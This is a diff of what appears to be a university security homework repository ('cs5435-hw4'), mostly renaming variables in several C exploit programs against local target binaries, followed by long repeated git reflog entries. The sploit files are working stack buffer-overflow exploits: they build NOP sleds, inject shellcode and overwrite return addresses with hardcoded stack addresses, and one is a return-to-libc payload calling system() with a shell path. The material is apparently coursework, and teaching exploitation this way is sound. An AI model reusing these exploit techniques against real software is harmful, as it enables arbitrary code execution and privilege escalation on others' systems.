@@ -366,31 +366,31 @@ int main(void)
 
 #define TARGET "/srv/target2"
 
-const int BUFFER_SIZE = 409;
-const int SHELLCODE_OFFSET = 201;
-const uint32_t RETURN_ADDRESS = 0xffffdb5c;
+const int BSIZE = 409;
+const int DIFF = 201;
+const uint32_t RET = 0xffffdb5c;
 
-void preparePayload(char *buffer) {
-    memset(buffer, 0x90, BUFFER_SIZE - 1);
-    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);
+void prep(char *buf) {
+    memset(buf, 0x90, BSIZE - 1);
+    memcpy(buf + DIFF, shellcode, sizeof(shellcode) - 1);
 
-    for (int i = SHELLCODE_OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
-        *(uint32_t *)(buffer + i) = RETURN_ADDRESS;
+    for (int i = DIFF + sizeof(shellcode) - 1; i < BSIZE - 1; i += 4) {
+        *(uint32_t *)(buf + i) = RET;
     }
 
-    buffer[BUFFER_SIZE - 1] = '\0';
+    buf[BSIZE - 1] = '\0';
 }
 
 int main(void)
 {
     char *args[4];
     char *env[1];
-    char payload[BUFFER_SIZE];
+    char buf[BSIZE];
 
-    preparePayload(payload);
+    prep(buf);
 
     args[0] = TARGET;
-    args[1] = payload;
+    args[1] = buf;
     args[2] = "65935";
     args[3] = NULL;
 
@@ -468,39 +468,38 @@ if __name__ == "__main__":
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target3"
-#define ENV_SIZE 400
-#define BASE_ADDRESS 0xffffdec0
-#define NOP_SLED_SIZE 201
-#define NOP 0x90
-#define RET_ADDR_OFFSET 4
+const char* TARGET = "/srv/target3";
 
-const uint32_t StartAddress = BASE_ADDRESS + RET_ADDR_OFFSET;
-const uint32_t SecondAddress = BASE_ADDRESS + 2 * RET_ADDR_OFFSET;
-const char Padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+const int ESIZE = 400;
+const uint32_t BASE = 0xffffdec0;
+const int NSIZE = 201;
+const char NOP = 0x90;
+const int DIFF = 4;
+const uint32_t A1 = BASE + DIFF;
+const uint32_t A2 = BASE + 2 * DIFF;
+const char buf[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
-void prepareEnvironment(char *environment) {
-    memset(environment, NOP, ENV_SIZE - 1);
-    *((uint32_t *)(environment)) = StartAddress;
-    *((uint32_t *)(environment + RET_ADDR_OFFSET)) = SecondAddress;
-    memcpy(environment + NOP_SLED_SIZE, shellcode, sizeof(shellcode));
-    environment[ENV_SIZE - 1] = '\0';
+void prep(char *e) {
+    memset(e, NOP, ESIZE - 1);
+    *((uint32_t *)(e)) = A1;
+    *((uint32_t *)(e + DIFF)) = A2;
+    memcpy(e + NSIZE, shellcode, sizeof(shellcode));
+    e[ESIZE - 1] = '\0';
 }
 
 int main(void) {
-    char *arguments[] = {TARGET, Padding, NULL};
-    static char environment[ENV_SIZE];
+    char *args[] = {TARGET, buf, NULL};
+    char env[ESIZE];
 
-    prepareEnvironment(environment);
+    prep(env);
 
-    char *env[] = {environment};
+    char *envp[] = {env};
 
-    execve(TARGET, arguments, env);
+    execve(TARGET, args, envp);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
 }
-
 <END OF ./cs5435-hw4/sploits/sploit3.c>
 <START OF ./cs5435-hw4/sploits/shellcode.h>
 static char shellcode[] = 
@@ -520,27 +519,27 @@ static char shellcode[] =
 
 #define TARGET "/srv/target0"
 
-const int PAYLOAD_SIZE = 408;
-const int SHELLCODE_SIZE = sizeof(shellcode) - 1;
-const uint32_t RETURN_ADDRESS = 0xffffdb2c;
+const int BSIZE = 408;
+const int SHSIZE = sizeof(shellcode) - 1;
+const uint32_t RET = 0xffffdb2c;
 
-void preparePayload(char *payload) {
-    memset(payload, 0x90, PAYLOAD_SIZE);
-    payload[PAYLOAD_SIZE] = '\0';
-    memcpy(payload, shellcode, SHELLCODE_SIZE);
-    *(uint32_t*)(payload + PAYLOAD_SIZE - 4) = RETURN_ADDRESS;
+void prep(char *buf) {
+    memset(buf, 0x90, BSIZE);
+    buf[BSIZE] = '\0';
+    memcpy(buf, shellcode, SHSIZE);
+    *(uint32_t*)(buf + BSIZE - 4) = RET;
 }
 
 int main(void)
 {
     char *args[3];
     char *env[1];
-    char payload[PAYLOAD_SIZE + 1];
+    char buf[BSIZE + 1];
 
-    preparePayload(payload);
+    prep(buf);
 
     args[0] = TARGET;
-    args[1] = payload;
+    args[1] = buf;
     args[2] = NULL;
 
     env[0] = NULL;
@@ -553,9 +552,9 @@ int main(void)
 <END OF ./cs5435-hw4/sploits/sploit0.c>
 <START OF ./cs5435-hw4/sploits/sploit4.c>
 #include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
 #include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 #include "shellcode.h"
 
@@ -567,10 +566,10 @@ int main(void)
   char *env[2];
 
   args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90"; //NOP SLED
-            "\x60\x43\xe1\xf7" //Address of system()
-            "\xc0\x6e\xe0\xf7" //Address of exit()
-            "\x63\xf3\xf5\xf7"; //Address of /bin/zh
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90"
+            "\x60\x43\xe1\xf7"
+            "\xc0\x6e\xe0\xf7"
+            "\x63\xf3\xf5\xf7";
   args[2] = NULL;
 
   env[0] = "/bin/zsh";
@@ -1179,6 +1178,31 @@ dd503d0e4ca4ed6b86c62388c85cdc54a03256f6 6c0b2d5867f396a97b23cde8ed5211a14f0c224
 e83b727d1762061b00cc378e9e600cda749b3965 4187ce2e3f77403c7eb4651891e4142b5e3f41ac justinhalford <justinhalford@gmail.com> 1715382652 -0400	commit: may 7
 4187ce2e3f77403c7eb4651891e4142b5e3f41ac 21d3c37666d45cce3a83a9b93e3b4210151915b9 justinhalford <justinhalford@gmail.com> 1715382662 -0400	commit: may 7
 21d3c37666d45cce3a83a9b93e3b4210151915b9 d7dafefe27ba333f459e25575ca0bafa491fd46b justinhalford <justinhalford@gmail.com> 1715382671 -0400	commit: may 7
+d7dafefe27ba333f459e25575ca0bafa491fd46b 3311e4f33ed1834a9ea7f895f9e985849e003361 justinhalford <justinhalford@gmail.com> 1715382858 -0400	commit: may 7
+3311e4f33ed1834a9ea7f895f9e985849e003361 d1ec71a64b90955e37aeed39aa419f3197ade355 justinhalford <justinhalford@gmail.com> 1715382892 -0400	commit: may 7
+d1ec71a64b90955e37aeed39aa419f3197ade355 899a633700bb417e6472977e2d1abf6d638027ae justinhalford <justinhalford@gmail.com> 1715382978 -0400	commit: may 7
+899a633700bb417e6472977e2d1abf6d638027ae a3984938432686ba4df2c95eb65b5cf9e9f31641 justinhalford <justinhalford@gmail.com> 1715383009 -0400	commit: may 7
+a3984938432686ba4df2c95eb65b5cf9e9f31641 5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 justinhalford <justinhalford@gmail.com> 1715383026 -0400	commit: may 7
+5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 933167130761652c11e6af17f43782718933abee justinhalford <justinhalford@gmail.com> 1715383096 -0400	commit: may 7
+933167130761652c11e6af17f43782718933abee 6ccccfa794d72071f763167919ac735c09d65641 justinhalford <justinhalford@gmail.com> 1715383145 -0400	commit: may 7
+6ccccfa794d72071f763167919ac735c09d65641 78370f9cf6b56836b8fc495e7caf4cbccab2e82c justinhalford <justinhalford@gmail.com> 1715383231 -0400	commit: may 7
+78370f9cf6b56836b8fc495e7caf4cbccab2e82c 8634c0fdb323ce207efc409f6fd789e34197424b justinhalford <justinhalford@gmail.com> 1715383251 -0400	commit: may 7
+8634c0fdb323ce207efc409f6fd789e34197424b eaa53e37db0682f2c1aefd185a14cf8d3d80507e justinhalford <justinhalford@gmail.com> 1715383400 -0400	commit: may 7
+eaa53e37db0682f2c1aefd185a14cf8d3d80507e a94c97ce7ff5b186f188cd8f110ad9bdc212b225 justinhalford <justinhalford@gmail.com> 1715383453 -0400	commit: may 7
+a94c97ce7ff5b186f188cd8f110ad9bdc212b225 39d571f431967e0c9352b2d9835be170e9f818cd justinhalford <justinhalford@gmail.com> 1715383460 -0400	commit: may 7
+39d571f431967e0c9352b2d9835be170e9f818cd 524963ab29277056d93616a76b563a6454671341 justinhalford <justinhalford@gmail.com> 1715383563 -0400	commit: may 7
+524963ab29277056d93616a76b563a6454671341 8d02f023905746625979a31d45bfa7929d4d5cdd justinhalford <justinhalford@gmail.com> 1715383573 -0400	commit: may 7
+8d02f023905746625979a31d45bfa7929d4d5cdd 29d73f16f0120790a49bf07703c2d812a1dc9aba justinhalford <justinhalford@gmail.com> 1715383584 -0400	commit: may 7
+29d73f16f0120790a49bf07703c2d812a1dc9aba 98ce28c9d1a8c42ecdf9fb204902987b632333af justinhalford <justinhalford@gmail.com> 1715383595 -0400	commit: may 7
+98ce28c9d1a8c42ecdf9fb204902987b632333af d147a6aee8432d93a3f9aabc2f886fd0977fb78e justinhalford <justinhalford@gmail.com> 1715383672 -0400	commit: may 7
+d147a6aee8432d93a3f9aabc2f886fd0977fb78e 932d69f9da21d524e584c9cb53043b514bcfd7b2 justinhalford <justinhalford@gmail.com> 1715383699 -0400	commit: may 7
+932d69f9da21d524e584c9cb53043b514bcfd7b2 d5af662a610f6a158585390eb3049279c4d3879f justinhalford <justinhalford@gmail.com> 1715383761 -0400	commit: may 7
+d5af662a610f6a158585390eb3049279c4d3879f a367eadd204f119d8419821031ccacb806280906 justinhalford <justinhalford@gmail.com> 1715383788 -0400	commit: may 7
+a367eadd204f119d8419821031ccacb806280906 f62b9a8b8e0c4f83ee5992807acfd28099dce507 justinhalford <justinhalford@gmail.com> 1715383803 -0400	commit: may 7
+f62b9a8b8e0c4f83ee5992807acfd28099dce507 cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 justinhalford <justinhalford@gmail.com> 1715387446 -0400	commit: may 7
+cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 f46b7b672386946268850dec0c1b4c4e3505fdbc justinhalford <justinhalford@gmail.com> 1715387619 -0400	commit: may 7
+f46b7b672386946268850dec0c1b4c4e3505fdbc 07b69abb102fed6e835af43aee45bef7daf4d307 justinhalford <justinhalford@gmail.com> 1715387722 -0400	commit: may 7
+07b69abb102fed6e835af43aee45bef7daf4d307 10320e1ee34661b1b312d9107df873eafdba286e justinhalford <justinhalford@gmail.com> 1715388017 -0400	commit: may 7
 
 <END OF ./.git/logs/HEAD>
 <START OF ./.git/logs/refs/heads/master>
@@ -1309,6 +1333,31 @@ dd503d0e4ca4ed6b86c62388c85cdc54a03256f6 6c0b2d5867f396a97b23cde8ed5211a14f0c224
 e83b727d1762061b00cc378e9e600cda749b3965 4187ce2e3f77403c7eb4651891e4142b5e3f41ac justinhalford <justinhalford@gmail.com> 1715382652 -0400	commit: may 7
 4187ce2e3f77403c7eb4651891e4142b5e3f41ac 21d3c37666d45cce3a83a9b93e3b4210151915b9 justinhalford <justinhalford@gmail.com> 1715382662 -0400	commit: may 7
 21d3c37666d45cce3a83a9b93e3b4210151915b9 d7dafefe27ba333f459e25575ca0bafa491fd46b justinhalford <justinhalford@gmail.com> 1715382671 -0400	commit: may 7
+d7dafefe27ba333f459e25575ca0bafa491fd46b 3311e4f33ed1834a9ea7f895f9e985849e003361 justinhalford <justinhalford@gmail.com> 1715382858 -0400	commit: may 7
+3311e4f33ed1834a9ea7f895f9e985849e003361 d1ec71a64b90955e37aeed39aa419f3197ade355 justinhalford <justinhalford@gmail.com> 1715382892 -0400	commit: may 7
+d1ec71a64b90955e37aeed39aa419f3197ade355 899a633700bb417e6472977e2d1abf6d638027ae justinhalford <justinhalford@gmail.com> 1715382978 -0400	commit: may 7
+899a633700bb417e6472977e2d1abf6d638027ae a3984938432686ba4df2c95eb65b5cf9e9f31641 justinhalford <justinhalford@gmail.com> 1715383009 -0400	commit: may 7
+a3984938432686ba4df2c95eb65b5cf9e9f31641 5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 justinhalford <justinhalford@gmail.com> 1715383026 -0400	commit: may 7
+5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 933167130761652c11e6af17f43782718933abee justinhalford <justinhalford@gmail.com> 1715383096 -0400	commit: may 7
+933167130761652c11e6af17f43782718933abee 6ccccfa794d72071f763167919ac735c09d65641 justinhalford <justinhalford@gmail.com> 1715383145 -0400	commit: may 7
+6ccccfa794d72071f763167919ac735c09d65641 78370f9cf6b56836b8fc495e7caf4cbccab2e82c justinhalford <justinhalford@gmail.com> 1715383231 -0400	commit: may 7
+78370f9cf6b56836b8fc495e7caf4cbccab2e82c 8634c0fdb323ce207efc409f6fd789e34197424b justinhalford <justinhalford@gmail.com> 1715383251 -0400	commit: may 7
+8634c0fdb323ce207efc409f6fd789e34197424b eaa53e37db0682f2c1aefd185a14cf8d3d80507e justinhalford <justinhalford@gmail.com> 1715383400 -0400	commit: may 7
+eaa53e37db0682f2c1aefd185a14cf8d3d80507e a94c97ce7ff5b186f188cd8f110ad9bdc212b225 justinhalford <justinhalford@gmail.com> 1715383453 -0400	commit: may 7
+a94c97ce7ff5b186f188cd8f110ad9bdc212b225 39d571f431967e0c9352b2d9835be170e9f818cd justinhalford <justinhalford@gmail.com> 1715383460 -0400	commit: may 7
+39d571f431967e0c9352b2d9835be170e9f818cd 524963ab29277056d93616a76b563a6454671341 justinhalford <justinhalford@gmail.com> 1715383563 -0400	commit: may 7
+524963ab29277056d93616a76b563a6454671341 8d02f023905746625979a31d45bfa7929d4d5cdd justinhalford <justinhalford@gmail.com> 1715383573 -0400	commit: may 7
+8d02f023905746625979a31d45bfa7929d4d5cdd 29d73f16f0120790a49bf07703c2d812a1dc9aba justinhalford <justinhalford@gmail.com> 1715383584 -0400	commit: may 7
+29d73f16f0120790a49bf07703c2d812a1dc9aba 98ce28c9d1a8c42ecdf9fb204902987b632333af justinhalford <justinhalford@gmail.com> 1715383595 -0400	commit: may 7
+98ce28c9d1a8c42ecdf9fb204902987b632333af d147a6aee8432d93a3f9aabc2f886fd0977fb78e justinhalford <justinhalford@gmail.com> 1715383672 -0400	commit: may 7
+d147a6aee8432d93a3f9aabc2f886fd0977fb78e 932d69f9da21d524e584c9cb53043b514bcfd7b2 justinhalford <justinhalford@gmail.com> 1715383699 -0400	commit: may 7
+932d69f9da21d524e584c9cb53043b514bcfd7b2 d5af662a610f6a158585390eb3049279c4d3879f justinhalford <justinhalford@gmail.com> 1715383761 -0400	commit: may 7
+d5af662a610f6a158585390eb3049279c4d3879f a367eadd204f119d8419821031ccacb806280906 justinhalford <justinhalford@gmail.com> 1715383788 -0400	commit: may 7
+a367eadd204f119d8419821031ccacb806280906 f62b9a8b8e0c4f83ee5992807acfd28099dce507 justinhalford <justinhalford@gmail.com> 1715383803 -0400	commit: may 7
+f62b9a8b8e0c4f83ee5992807acfd28099dce507 cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 justinhalford <justinhalford@gmail.com> 1715387446 -0400	commit: may 7
+cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 f46b7b672386946268850dec0c1b4c4e3505fdbc justinhalford <justinhalford@gmail.com> 1715387619 -0400	commit: may 7
+f46b7b672386946268850dec0c1b4c4e3505fdbc 07b69abb102fed6e835af43aee45bef7daf4d307 justinhalford <justinhalford@gmail.com> 1715387722 -0400	commit: may 7
+07b69abb102fed6e835af43aee45bef7daf4d307 10320e1ee34661b1b312d9107df873eafdba286e justinhalford <justinhalford@gmail.com> 1715388017 -0400	commit: may 7
 
 <END OF ./.git/logs/refs/heads/master>
 <START OF ./.git/logs/refs/remotes/origin/master>
@@ -1440,6 +1489,31 @@ dd503d0e4ca4ed6b86c62388c85cdc54a03256f6 6c0b2d5867f396a97b23cde8ed5211a14f0c224
 e83b727d1762061b00cc378e9e600cda749b3965 4187ce2e3f77403c7eb4651891e4142b5e3f41ac justinhalford <justinhalford@gmail.com> 1715382652 -0400	update by push
 4187ce2e3f77403c7eb4651891e4142b5e3f41ac 21d3c37666d45cce3a83a9b93e3b4210151915b9 justinhalford <justinhalford@gmail.com> 1715382663 -0400	update by push
 21d3c37666d45cce3a83a9b93e3b4210151915b9 d7dafefe27ba333f459e25575ca0bafa491fd46b justinhalford <justinhalford@gmail.com> 1715382672 -0400	update by push
+d7dafefe27ba333f459e25575ca0bafa491fd46b 3311e4f33ed1834a9ea7f895f9e985849e003361 justinhalford <justinhalford@gmail.com> 1715382859 -0400	update by push
+3311e4f33ed1834a9ea7f895f9e985849e003361 d1ec71a64b90955e37aeed39aa419f3197ade355 justinhalford <justinhalford@gmail.com> 1715382892 -0400	update by push
+d1ec71a64b90955e37aeed39aa419f3197ade355 899a633700bb417e6472977e2d1abf6d638027ae justinhalford <justinhalford@gmail.com> 1715382979 -0400	update by push
+899a633700bb417e6472977e2d1abf6d638027ae a3984938432686ba4df2c95eb65b5cf9e9f31641 justinhalford <justinhalford@gmail.com> 1715383010 -0400	update by push
+a3984938432686ba4df2c95eb65b5cf9e9f31641 5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 justinhalford <justinhalford@gmail.com> 1715383027 -0400	update by push
+5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 933167130761652c11e6af17f43782718933abee justinhalford <justinhalford@gmail.com> 1715383097 -0400	update by push
+933167130761652c11e6af17f43782718933abee 6ccccfa794d72071f763167919ac735c09d65641 justinhalford <justinhalford@gmail.com> 1715383146 -0400	update by push
+6ccccfa794d72071f763167919ac735c09d65641 78370f9cf6b56836b8fc495e7caf4cbccab2e82c justinhalford <justinhalford@gmail.com> 1715383232 -0400	update by push
+78370f9cf6b56836b8fc495e7caf4cbccab2e82c 8634c0fdb323ce207efc409f6fd789e34197424b justinhalford <justinhalford@gmail.com> 1715383251 -0400	update by push
+8634c0fdb323ce207efc409f6fd789e34197424b eaa53e37db0682f2c1aefd185a14cf8d3d80507e justinhalford <justinhalford@gmail.com> 1715383401 -0400	update by push
+eaa53e37db0682f2c1aefd185a14cf8d3d80507e a94c97ce7ff5b186f188cd8f110ad9bdc212b225 justinhalford <justinhalford@gmail.com> 1715383453 -0400	update by push
+a94c97ce7ff5b186f188cd8f110ad9bdc212b225 39d571f431967e0c9352b2d9835be170e9f818cd justinhalford <justinhalford@gmail.com> 1715383461 -0400	update by push
+39d571f431967e0c9352b2d9835be170e9f818cd 524963ab29277056d93616a76b563a6454671341 justinhalford <justinhalford@gmail.com> 1715383563 -0400	update by push
+524963ab29277056d93616a76b563a6454671341 8d02f023905746625979a31d45bfa7929d4d5cdd justinhalford <justinhalford@gmail.com> 1715383573 -0400	update by push
+8d02f023905746625979a31d45bfa7929d4d5cdd 29d73f16f0120790a49bf07703c2d812a1dc9aba justinhalford <justinhalford@gmail.com> 1715383585 -0400	update by push
+29d73f16f0120790a49bf07703c2d812a1dc9aba 98ce28c9d1a8c42ecdf9fb204902987b632333af justinhalford <justinhalford@gmail.com> 1715383596 -0400	update by push
+98ce28c9d1a8c42ecdf9fb204902987b632333af d147a6aee8432d93a3f9aabc2f886fd0977fb78e justinhalford <justinhalford@gmail.com> 1715383673 -0400	update by push
+d147a6aee8432d93a3f9aabc2f886fd0977fb78e 932d69f9da21d524e584c9cb53043b514bcfd7b2 justinhalford <justinhalford@gmail.com> 1715383700 -0400	update by push
+932d69f9da21d524e584c9cb53043b514bcfd7b2 d5af662a610f6a158585390eb3049279c4d3879f justinhalford <justinhalford@gmail.com> 1715383761 -0400	update by push
+d5af662a610f6a158585390eb3049279c4d3879f a367eadd204f119d8419821031ccacb806280906 justinhalford <justinhalford@gmail.com> 1715383788 -0400	update by push
+a367eadd204f119d8419821031ccacb806280906 f62b9a8b8e0c4f83ee5992807acfd28099dce507 justinhalford <justinhalford@gmail.com> 1715383803 -0400	update by push
+f62b9a8b8e0c4f83ee5992807acfd28099dce507 cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 justinhalford <justinhalford@gmail.com> 1715387447 -0400	update by push
+cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 f46b7b672386946268850dec0c1b4c4e3505fdbc justinhalford <justinhalford@gmail.com> 1715387619 -0400	update by push
+f46b7b672386946268850dec0c1b4c4e3505fdbc 07b69abb102fed6e835af43aee45bef7daf4d307 justinhalford <justinhalford@gmail.com> 1715387723 -0400	update by push
+07b69abb102fed6e835af43aee45bef7daf4d307 10320e1ee34661b1b312d9107df873eafdba286e justinhalford <justinhalford@gmail.com> 1715388018 -0400	update by push
 
 <END OF ./.git/logs/refs/remotes/origin/master>
 <START OF ./.git/hooks/commit-msg.sample>
@@ -2191,11 +2265,11 @@ exit 0
 
 <END OF ./.git/hooks/update.sample>
 <START OF ./.git/refs/heads/master>
-d7dafefe27ba333f459e25575ca0bafa491fd46b
+10320e1ee34661b1b312d9107df873eafdba286e
 
 <END OF ./.git/refs/heads/master>
 <START OF ./.git/refs/remotes/origin/master>
-d7dafefe27ba333f459e25575ca0bafa491fd46b
+10320e1ee34661b1b312d9107df873eafdba286e
 
 <END OF ./.git/refs/remotes/origin/master>
 <START OF ./.vscode/settings.json>
@@ -2585,31 +2659,31 @@ int main(void)
 
 #define TARGET "/srv/target2"
 
-const int BUFFER_SIZE = 409;
-const int SHELLCODE_OFFSET = 201;
-const uint32_t RETURN_ADDRESS = 0xffffdb5c;
+const int BSIZE = 409;
+const int DIFF = 201;
+const uint32_t RET = 0xffffdb5c;
 
-void preparePayload(char *buffer) {
-    memset(buffer, 0x90, BUFFER_SIZE - 1);
-    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);
+void prep(char *buf) {
+    memset(buf, 0x90, BSIZE - 1);
+    memcpy(buf + DIFF, shellcode, sizeof(shellcode) - 1);
 
-    for (int i = SHELLCODE_OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
-        *(uint32_t *)(buffer + i) = RETURN_ADDRESS;
+    for (int i = DIFF + sizeof(shellcode) - 1; i < BSIZE - 1; i += 4) {
+        *(uint32_t *)(buf + i) = RET;
     }
 
-    buffer[BUFFER_SIZE - 1] = '\0';
+    buf[BSIZE - 1] = '\0';
 }
 
 int main(void)
 {
     char *args[4];
     char *env[1];
-    char payload[BUFFER_SIZE];
+    char buf[BSIZE];
 
-    preparePayload(payload);
+    prep(buf);
 
     args[0] = TARGET;
-    args[1] = payload;
+    args[1] = buf;
     args[2] = "65935";
     args[3] = NULL;
 
@@ -2687,39 +2761,38 @@ if __name__ == "__main__":
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target3"
-#define ENV_SIZE 400
-#define BASE_ADDRESS 0xffffdec0
-#define NOP_SLED_SIZE 201
-#define NOP 0x90
-#define RET_ADDR_OFFSET 4
+const char* TARGET = "/srv/target3";
 
-const uint32_t StartAddress = BASE_ADDRESS + RET_ADDR_OFFSET;
-const uint32_t SecondAddress = BASE_ADDRESS + 2 * RET_ADDR_OFFSET;
-const char Padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+const int ESIZE = 400;
+const uint32_t BASE = 0xffffdec0;
+const int NSIZE = 201;
+const char NOP = 0x90;
+const int DIFF = 4;
+const uint32_t A1 = BASE + DIFF;
+const uint32_t A2 = BASE + 2 * DIFF;
+const char buf[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
-void prepareEnvironment(char *environment) {
-    memset(environment, NOP, ENV_SIZE - 1);
-    *((uint32_t *)(environment)) = StartAddress;
-    *((uint32_t *)(environment + RET_ADDR_OFFSET)) = SecondAddress;
-    memcpy(environment + NOP_SLED_SIZE, shellcode, sizeof(shellcode));
-    environment[ENV_SIZE - 1] = '\0';
+void prep(char *e) {
+    memset(e, NOP, ESIZE - 1);
+    *((uint32_t *)(e)) = A1;
+    *((uint32_t *)(e + DIFF)) = A2;
+    memcpy(e + NSIZE, shellcode, sizeof(shellcode));
+    e[ESIZE - 1] = '\0';
 }
 
 int main(void) {
-    char *arguments[] = {TARGET, Padding, NULL};
-    static char environment[ENV_SIZE];
+    char *args[] = {TARGET, buf, NULL};
+    char env[ESIZE];
 
-    prepareEnvironment(environment);
+    prep(env);
 
-    char *env[] = {environment};
+    char *envp[] = {env};
 
-    execve(TARGET, arguments, env);
+    execve(TARGET, args, envp);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
 }
-
 <END OF ./cs5435-hw4/sploits/sploit3.c>
 <START OF ./cs5435-hw4/sploits/shellcode.h>
 static char shellcode[] = 
@@ -2739,27 +2812,27 @@ static char shellcode[] =
 
 #define TARGET "/srv/target0"
 
-const int PAYLOAD_SIZE = 408;
-const int SHELLCODE_SIZE = sizeof(shellcode) - 1;
-const uint32_t RETURN_ADDRESS = 0xffffdb2c;
+const int BSIZE = 408;
+const int SHSIZE = sizeof(shellcode) - 1;
+const uint32_t RET = 0xffffdb2c;
 
-void preparePayload(char *payload) {
-    memset(payload, 0x90, PAYLOAD_SIZE);
-    payload[PAYLOAD_SIZE] = '\0';
-    memcpy(payload, shellcode, SHELLCODE_SIZE);
-    *(uint32_t*)(payload + PAYLOAD_SIZE - 4) = RETURN_ADDRESS;
+void prep(char *buf) {
+    memset(buf, 0x90, BSIZE);
+    buf[BSIZE] = '\0';
+    memcpy(buf, shellcode, SHSIZE);
+    *(uint32_t*)(buf + BSIZE - 4) = RET;
 }
 
 int main(void)
 {
     char *args[3];
     char *env[1];
-    char payload[PAYLOAD_SIZE + 1];
+    char buf[BSIZE + 1];
 
-    preparePayload(payload);
+    prep(buf);
 
     args[0] = TARGET;
-    args[1] = payload;
+    args[1] = buf;
     args[2] = NULL;
 
     env[0] = NULL;
@@ -2772,9 +2845,9 @@ int main(void)
 <END OF ./cs5435-hw4/sploits/sploit0.c>
 <START OF ./cs5435-hw4/sploits/sploit4.c>
 #include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
 #include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 #include "shellcode.h"
 
@@ -2786,10 +2859,10 @@ int main(void)
   char *env[2];
 
   args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90"; //NOP SLED
-            "\x60\x43\xe1\xf7" //Address of system()
-            "\xc0\x6e\xe0\xf7" //Address of exit()
-            "\x63\xf3\xf5\xf7"; //Address of /bin/zh
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90"
+            "\x60\x43\xe1\xf7"
+            "\xc0\x6e\xe0\xf7"
+            "\x63\xf3\xf5\xf7";
   args[2] = NULL;
 
   env[0] = "/bin/zsh";
@@ -3398,6 +3471,31 @@ dd503d0e4ca4ed6b86c62388c85cdc54a03256f6 6c0b2d5867f396a97b23cde8ed5211a14f0c224
 e83b727d1762061b00cc378e9e600cda749b3965 4187ce2e3f77403c7eb4651891e4142b5e3f41ac justinhalford <justinhalford@gmail.com> 1715382652 -0400	commit: may 7
 4187ce2e3f77403c7eb4651891e4142b5e3f41ac 21d3c37666d45cce3a83a9b93e3b4210151915b9 justinhalford <justinhalford@gmail.com> 1715382662 -0400	commit: may 7
 21d3c37666d45cce3a83a9b93e3b4210151915b9 d7dafefe27ba333f459e25575ca0bafa491fd46b justinhalford <justinhalford@gmail.com> 1715382671 -0400	commit: may 7
+d7dafefe27ba333f459e25575ca0bafa491fd46b 3311e4f33ed1834a9ea7f895f9e985849e003361 justinhalford <justinhalford@gmail.com> 1715382858 -0400	commit: may 7
+3311e4f33ed1834a9ea7f895f9e985849e003361 d1ec71a64b90955e37aeed39aa419f3197ade355 justinhalford <justinhalford@gmail.com> 1715382892 -0400	commit: may 7
+d1ec71a64b90955e37aeed39aa419f3197ade355 899a633700bb417e6472977e2d1abf6d638027ae justinhalford <justinhalford@gmail.com> 1715382978 -0400	commit: may 7
+899a633700bb417e6472977e2d1abf6d638027ae a3984938432686ba4df2c95eb65b5cf9e9f31641 justinhalford <justinhalford@gmail.com> 1715383009 -0400	commit: may 7
+a3984938432686ba4df2c95eb65b5cf9e9f31641 5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 justinhalford <justinhalford@gmail.com> 1715383026 -0400	commit: may 7
+5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 933167130761652c11e6af17f43782718933abee justinhalford <justinhalford@gmail.com> 1715383096 -0400	commit: may 7
+933167130761652c11e6af17f43782718933abee 6ccccfa794d72071f763167919ac735c09d65641 justinhalford <justinhalford@gmail.com> 1715383145 -0400	commit: may 7
+6ccccfa794d72071f763167919ac735c09d65641 78370f9cf6b56836b8fc495e7caf4cbccab2e82c justinhalford <justinhalford@gmail.com> 1715383231 -0400	commit: may 7
+78370f9cf6b56836b8fc495e7caf4cbccab2e82c 8634c0fdb323ce207efc409f6fd789e34197424b justinhalford <justinhalford@gmail.com> 1715383251 -0400	commit: may 7
+8634c0fdb323ce207efc409f6fd789e34197424b eaa53e37db0682f2c1aefd185a14cf8d3d80507e justinhalford <justinhalford@gmail.com> 1715383400 -0400	commit: may 7
+eaa53e37db0682f2c1aefd185a14cf8d3d80507e a94c97ce7ff5b186f188cd8f110ad9bdc212b225 justinhalford <justinhalford@gmail.com> 1715383453 -0400	commit: may 7
+a94c97ce7ff5b186f188cd8f110ad9bdc212b225 39d571f431967e0c9352b2d9835be170e9f818cd justinhalford <justinhalford@gmail.com> 1715383460 -0400	commit: may 7
+39d571f431967e0c9352b2d9835be170e9f818cd 524963ab29277056d93616a76b563a6454671341 justinhalford <justinhalford@gmail.com> 1715383563 -0400	commit: may 7
